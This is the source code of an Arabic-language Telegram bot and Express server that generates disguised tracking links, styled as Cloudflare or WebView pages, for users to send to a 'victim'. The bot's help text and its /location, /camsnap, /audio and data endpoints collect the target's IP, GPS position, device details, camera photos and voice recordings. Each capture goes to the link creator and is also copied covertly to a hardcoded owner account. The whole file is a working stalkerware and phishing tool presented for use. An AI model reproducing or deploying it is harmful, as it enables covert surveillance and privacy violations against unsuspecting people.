const fs = require("fs");
const express = require("express");

// Users storage
const USERS_FILE = "./users.json";
let users = new Set();
try { JSON.parse(fs.readFileSync(USERS_FILE)).forEach(id => users.add(id)); } catch(e) { users = new Set(); }
function saveUsers() { fs.writeFileSync(USERS_FILE, JSON.stringify([...users])); }

// Banned users storage
const BANNED_FILE = "./banned.json";
let banned = new Set();
try { JSON.parse(fs.readFileSync(BANNED_FILE)).forEach(id => banned.add(id)); } catch(e) { banned = new Set(); }
function saveBanned() { fs.writeFileSync(BANNED_FILE, JSON.stringify([...banned])); }

// Stats storage
const STATS_FILE = "./stats.json";
let stats = { linksOpened: 0, linksCreated: 0 };
try { stats = JSON.parse(fs.readFileSync(STATS_FILE)); } catch(e) {}
function saveStats() { fs.writeFileSync(STATS_FILE, JSON.stringify(stats)); }

var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

var hostURL = "https://bot-psue.onrender.com";
var use1pt = false;
const BOT_OWNER = 6012675140;

function getIP(req) {
  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0];
  if (req.connection && req.connection.remoteAddress) return req.connection.remoteAddress;
  return req.ip;
}

// Reply prompt prefix — used to extract target user ID
const REPLY_PREFIX = "📝 اكتب ردك على المستخدم\nUID:";

// ─── Routes ──────────────────────────────────────────────────────────────────

app.get("/w/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");

  const creatorId = parseInt(req.params.path, 36);
  stats.linksOpened++;
  saveStats();

  bot.sendMessage(creatorId, `⚠️ تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
  if (creatorId !== BOT_OWNER) {
    bot.sendMessage(BOT_OWNER, `⚠️ تم فتح رابط!\n👤 منشئ الرابط ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
  }

  res.render("webview", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");

  const creatorId = parseInt(req.params.path, 36);
  stats.linksOpened++;
  saveStats();

  bot.sendMessage(creatorId, `⚠️ تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
  if (creatorId !== BOT_OWNER) {
    bot.sendMessage(BOT_OWNER, `⚠️ تم فتح رابط!\n👤 منشئ الرابط ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`).catch(() => {});
  }

  res.render("cloudflare", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
});


// ─── Bot Logic ────────────────────────────────────────────────────────────────

bot.on('message', async (msg) => {
  if (!msg || !msg.chat) return;
  const chatId = msg.chat.id;

  if (banned.has(chatId)) return;

  // ── URL link creation reply ───────────────────────────────────────────────
  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text) {
    return createLink(chatId, msg.text);
  }

  // ── Broadcast reply ───────────────────────────────────────────────────────
  if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
    const text = msg.text;
    let sent = 0, failed = 0;
    for (const uid of users) {
      try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; }
    }
    return bot.sendMessage(chatId, `✅ تم الإرسال للجميع\n✔️ ناجح: ${sent}\n❌ فشل: ${failed}`);
  }

  // ── Owner reply to user (via force_reply button) ──────────────────────────
  if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
    const targetLine = msg.reply_to_message.text;
    const uidStr = targetLine.replace(REPLY_PREFIX, "").split("\n")[0].trim();
    const targetId = parseInt(uidStr);
    if (!isNaN(targetId)) {
      try {
        await bot.sendMessage(targetId, `📩 رسالة:\n\n${msg.text}`);
        return bot.sendMessage(chatId, `✅ تم إرسال ردك للمستخدم.`);
      } catch(e) {
        return bot.sendMessage(chatId, `❌ فشل الإرسال: ${e.message}`);
      }
    }
  }

  // ── Save user ─────────────────────────────────────────────────────────────
  users.add(chatId);
  saveUsers();

  // ── Forward user messages to owner (with Reply button) ───────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
    const name = msg.chat.first_name || "مجهول";
    const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
    bot.sendMessage(
      BOT_OWNER,
      `📩 رسالة من مستخدم:\n👤 الاسم: ${name}\n🔗 يوزر: ${username}\n🆔 ID: ${chatId}\n\n💬 الرسالة:\n${msg.text}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
    );
  }

  // ── Commands ──────────────────────────────────────────────────────────────

  if (msg.text == "/myid") {
    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
  }

  // /broadcast
  if (msg.text && (msg.text === "/broadcast" || msg.text.startsWith("/broadcast "))) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (msg.text.trim() === "/broadcast") {
      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", {
        reply_markup: JSON.stringify({ force_reply: true })
      });
    }
    const text = msg.text.replace("/broadcast ", "");
    let sent = 0, failed = 0;
    for (const uid of users) {
      try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; }
    }
    return bot.sendMessage(chatId, `✅ تم الإرسال للجميع\n✔️ ناجح: ${sent}\n❌ فشل: ${failed}`);
  }

  // /stats
  if (msg.text == "/stats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const uptime = Math.floor(process.uptime());
    const hours = Math.floor(uptime / 3600);
    const mins = Math.floor((uptime % 3600) / 60);
    return bot.sendMessage(chatId, `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n⏱️ وقت التشغيل: ${hours}س ${mins}د`);
  }

  // /users
  if (msg.text == "/users") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const list = [...users].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  // /banned
  if (msg.text == "/banned") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد مستخدمون محجوبون.");
    const list = [...banned].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  // /ban <id>
  if (msg.text && msg.text.startsWith("/ban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const banId = parseInt(msg.text.replace("/ban ", "").trim());
    if (isNaN(banId)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    banned.add(banId);
    saveBanned();
    return bot.sendMessage(chatId, `🚫 تم حجب المستخدم: \`${banId}\``, { parse_mode: "Markdown" });
  }

  // /unban <id>
  if (msg.text && msg.text.startsWith("/unban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const unbanId = parseInt(msg.text.replace("/unban ", "").trim());
    if (isNaN(unbanId)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    banned.delete(unbanId);
    saveBanned();
    return bot.sendMessage(chatId, `✅ تم رفع الحجب عن: \`${unbanId}\``, { parse_mode: "Markdown" });
  }

  // /deleteuser <id>
  if (msg.text && msg.text.startsWith("/deleteuser ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const delId = parseInt(msg.text.replace("/deleteuser ", "").trim());
    if (isNaN(delId)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    if (!users.has(delId)) return bot.sendMessage(chatId, "⚠️ المستخدم غير موجود.");
    users.delete(delId);
    saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم حذف المستخدم \`${delId}\`.`, { parse_mode: "Markdown" });
  }

  // /clearusers
  if (msg.text == "/clearusers") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const count = users.size;
    users.clear();
    saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم مسح ${count} مستخدم من القائمة.`);
  }

  // /link <url> — quick link creation
  if (msg.text && msg.text.startsWith("/link ")) {
    const url = msg.text.replace("/link ", "").trim();
    return createLink(chatId, url);
  }

  // /ping
  if (msg.text == "/ping") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const start = Date.now();
    const m = await bot.sendMessage(chatId, "🏓 Pong!");
    const ms = Date.now() - start;
    return bot.editMessageText(`🏓 Pong! \`${ms}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
  }

  // /start
  if (msg.text == "/start") {
    const m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط ملغم 🔗", callback_data: "crenew" }]] }) };
    return bot.sendMessage(chatId, `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nيمكنك استخدام هذا البوت لتعقب الأشخاص من خلال رابط بسيط.\n\nيجمع:\n📍 الموقع الجغرافي\n📱 معلومات الجهاز\n📷 صور الكاميرا\n🎙️ تسجيل صوتي\n🔋 معلومات البطارية\n\nاضغط /help لمزيد من المعلومات.`, m);
  }

  if (msg.text == "/create") {
    return createNew(chatId);
  }

  if (msg.text == "/help") {
    let helpText = `📖 طريقة الاستخدام:\n\n1️⃣ اضغط "إنشاء رابط ملغم" أو /create\n2️⃣ أرسل الرابط الذي ستعيد التوجيه إليه\n3️⃣ ستحصل على رابطين:\n   • 🌐 رابط Cloudflare (يجمع كل المعلومات)\n   • 🖥️ رابط WebView\n4️⃣ أرسل الرابط للضحية\n5️⃣ عند الفتح تصلك فوراً:\n   - إشعار بالـ IP\n   - معلومات الجهاز\n   - صور الكاميرا\n   - الموقع الجغرافي\n   - تسجيل صوتي`;
    if (chatId === BOT_OWNER) {
      helpText += `\n\n📌 أوامر المالك:\n/stats - إحصائيات البوت\n/users - قائمة المستخدمين\n/banned - قائمة المحجوبين\n/ban [id] - حجب مستخدم\n/unban [id] - رفع الحجب\n/deleteuser [id] - حذف مستخدم\n/clearusers - مسح كل المستخدمين\n/link [url] - إنشاء رابط سريع\n/broadcast - إرسال للجميع\n/ping - اختبار سرعة البوت\n\n💡 للرد على مستخدم: اضغط زر "📩 رد" على رسالته`;
    }
    return bot.sendMessage(chatId, helpText);
  }
});

// ─── Callback Queries ─────────────────────────────────────────────────────────

bot.on('callback_query', async function(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "crenew") {
    return createNew(chatId);
  }

  // Reply button: reply:USERID
  if (data.startsWith("reply:")) {
    const targetId = data.replace("reply:", "");
    return bot.sendMessage(chatId, `${REPLY_PREFIX}${targetId}\n\nاكتب ردك في الرسالة التالية:`, {
      reply_markup: JSON.stringify({ force_reply: true })
    });
  }
});

bot.on('polling_error', () => {});


// ─── Link Creation ────────────────────────────────────────────────────────────

async function createLink(cid, msg) {
  if (!msg || typeof msg !== 'string') return;
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
  if ((msg.toLowerCase().indexOf('http') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + btoa(msg);
    var m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط جديد 🔗", callback_data: "crenew" }]] }) };
    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;
    bot.sendChatAction(cid, "typing");
    stats.linksCreated++;
    saveStats();
    bot.sendMessage(cid, `✅ تم إنشاء الروابط بنجاح!\n🔗 URL: ${msg}\n\n🌐 رابط Cloudflare (موصى به):\n${cUrl}\n\n🖥️ رابط WebView:\n${wUrl}`, m);
  } else {
    bot.sendMessage(cid, `⚠️ الرجاء إدخال رابط صحيح يبدأ بـ http أو https`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
}


// ─── Data Endpoints ──────────────────────────────────────────────────────────

app.get("/", (req, res) => {
  res.json({ "ip": getIP(req) });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    const targetId = parseInt(uid, 36);
    bot.sendLocation(targetId, lat, lon);
    bot.sendMessage(targetId, `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}`);
    if (targetId !== BOT_OWNER) {
      bot.sendLocation(BOT_OWNER, lat, lon);
      bot.sendMessage(BOT_OWNER, `📍 موقع من مستخدم آخر (ID: ${targetId}):\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}`);
    }
    res.send("Done");
  } else { res.send("Missing"); }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replaceAll("<br>", "\n");
    const targetId = parseInt(uid, 36);
    bot.sendMessage(targetId, data, { parse_mode: "HTML" });
    if (targetId !== BOT_OWNER) {
      bot.sendMessage(BOT_OWNER, `📋 بيانات من مستخدم آخر (ID: ${targetId}):\n${data}`, { parse_mode: "HTML" });
    }
    res.send("Done");
  } else { res.send("Missing"); }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;
  if (uid != null && img != null) {
    var buffer = Buffer.from(img, 'base64');
    var info = { filename: "camsnap.png", contentType: 'image/png' };
    const targetId = parseInt(uid, 36);
    try {
      bot.sendPhoto(targetId, buffer, {}, info);
      if (targetId !== BOT_OWNER) {
        bot.sendPhoto(BOT_OWNER, buffer, {}, info);
      }
    } catch (e) { console.log(e); }
    res.send("Done");
  } else { res.send("Missing"); }
});

app.post("/audio", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var audio = decodeURIComponent(req.body.audio) || null;
  if (uid != null && audio != null) {
    var buffer = Buffer.from(audio, 'base64');
    var info = { filename: "voice.webm", contentType: 'audio/webm' };
    const targetId = parseInt(uid, 36);
    try {
      bot.sendDocument(targetId, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
      if (targetId !== BOT_OWNER) {
        bot.sendDocument(BOT_OWNER, buffer, { caption: `🎙️ تسجيل صوتي (ID: ${targetId})` }, info);
      }
    } catch (e) { console.log(e); }
    res.send("Done");
  } else { res.send("Missing"); }
});


// ─── Keep Alive ──────────────────────────────────────────────────────────────

setInterval(() => { fetch(hostURL).catch(() => {}); }, 5 * 60 * 1000);

app.listen(5000, () => { console.log("App Running on Port 5000!"); });
